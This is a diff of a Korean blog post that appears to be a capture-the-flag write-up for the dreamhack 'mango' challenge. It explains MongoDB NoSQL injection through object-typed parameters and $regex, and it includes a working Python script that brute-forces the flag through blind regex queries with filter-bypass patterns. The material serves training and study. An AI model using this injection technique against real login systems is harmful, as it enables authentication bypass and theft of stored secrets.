@@ -461,8 +461,7 @@ SSTI는 Server-Side Templete Injection의 약자로 템플릿 엔진을 이용�
 
 # > dreamhack.kr: mango
 
-writeup
-
+##writeup
 
 
 ```javascript
@@ -516,3 +515,67 @@ app.listen(8000, '0.0.0.0');
 
 
 아 이거 풀다가 bob 11기 합격 명단을 봐버렸는데 내가 있다. 오늘 저녁은 치킨!
+{: .text-green-000}
+
+문제를 풀기위해 mongoDB에 대해 조금 알아보면 기존에 알던 mySQL과는 달리 **비관계형 데이터베이스**이다. SQL문을 사용하던 때와 달리 새로운 문법으로 key-value의 개념이 적용되어 있으며, JSON 형태의 쿼리를 사용한다. 기존 SQL 문과 비교하여 살펴보자.
+
+### mySQL
+
+```sql
+SELECT * FROM userinfo WHERE uid = "admin" and upw = "admin";
+```
+
+### mongoDB
+
+```sql
+db.userinfo.find({"uid":"admin","upw":"admin"})
+```
+
+<br>
+
+이 외에도 이전에 알던 문법과는 전혀 딴판이기에 드림핵 강의를 참고하여 문제를 풀었다. 그 중에서 사용된 취약점 부분과 문법을 짚고 넘어가자.
+
+### 1. 데이터 타입의 미검증
+
+예시를 보면 바로 이해가 가능하다.
+
+```
+login?uid=1234
+data: 1234
+type: string
+
+login?uid[1234]=1234
+data: [ '1234':'1234' ]
+type: object
+```
+
+데이터를 전달할 때 기존에는 SQL에서는 `uid=*` 형태로 전달하여 전부 문자열처럼 취급되었으나,  mongoDB에서는 전달하는 형태에 따라 데이터 형식이 `string` 또는 `object`로 변경될 수 있다. 물론 해당 문제에서 query의 타입이 문자열로 지정되어 있다면 발생하지 않는다.
+
+<br>
+
+### 2. `$regex`의 존재
+
+위 취약점과 함께 연계할 수 있는 표현이다. 정규식을 의미하여 Blind Injection에서 유용하게 사용된다. 가령 `db.user.find({upw: {$regex: "^a"}})` 이런 쿼리를 사용하게 될 경우에 `upw`라는 key의 해당하는 value 중에서 "a"로 시작하는 결과를 가져오게 되는 것이다.
+
+
+위 두가지와 와일드카드를 이용해서 익스코드를 완성했다.
+
+```python
+import requests, string
+HOST = 'http://host1.dreamhack.games:16090'
+ALPHANUMERIC = string.digits + string.ascii_letters
+SUCCESS = 'admin'
+flag = ''
+for i in range(32):
+	for ch in ALPHANUMERIC:
+		response = requests.get(f'{HOST}/login?uid[$regex]=ad.in&upw[$regex]=D.{{{flag}{ch}')
+		print(response.text)
+		if response.text == SUCCESS:
+			flag += ch
+			break
+	print(f'FLAG: DH{{{flag}}}')
+```
+
+`ad.in`을 통해 `admin`의 필터링을 우회하였고, 플래그 값이 `DH`로 시작하는 것을 알기 때문에 `D.`을 통해 `dh` 필터링을 우회했다. 정규식을 통해 데이터를 한조각씩 전부 찾아냄으로써 플래그를 획득했다.
+
+![image-20220627124922912](../img/image-20220627124922912.png)
